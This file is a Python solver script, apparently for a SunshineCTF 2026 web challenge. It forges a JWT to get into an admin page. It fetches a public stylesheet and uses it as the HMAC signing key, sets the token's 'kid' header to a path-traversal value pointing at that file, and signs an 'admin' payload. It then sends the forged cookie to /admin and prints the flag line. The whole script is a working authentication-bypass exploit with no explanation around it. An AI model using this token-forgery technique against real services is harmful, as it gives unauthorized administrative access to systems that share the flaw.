import json, base64, hmac, hashlib, urllib.request

def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# 1. Download publicly accessible static file
with urllib.request.urlopen("https://kidding.web.2026.sunshinectf.games/static/style.css") as resp:
    secret = resp.read()

# 2. Forge JWT with kid pointing to ../static/style.css
kid = "../static/style.css"
header = {"alg": "HS256", "kid": kid, "typ": "JWT"}
payload = {"sub": "admin", "role": "editor"}

h_b64 = b64u(json.dumps(header).encode())
p_b64 = b64u(json.dumps(payload).encode())
msg = f"{h_b64}.{p_b64}".encode()
sig = hmac.new(secret, msg, hashlib.sha256).digest()
s_b64 = b64u(sig)

token = f"{h_b64}.{p_b64}.{s_b64}"

# 3. Access /admin with forged token
req = urllib.request.Request("https://kidding.web.2026.sunshinectf.games/admin", headers={"Cookie": f"token={token}"})
with urllib.request.urlopen(req) as resp:
    html = resp.read().decode()
    for line in html.splitlines():
        if "sun{" in line:
            print("Flag line:", line.strip())
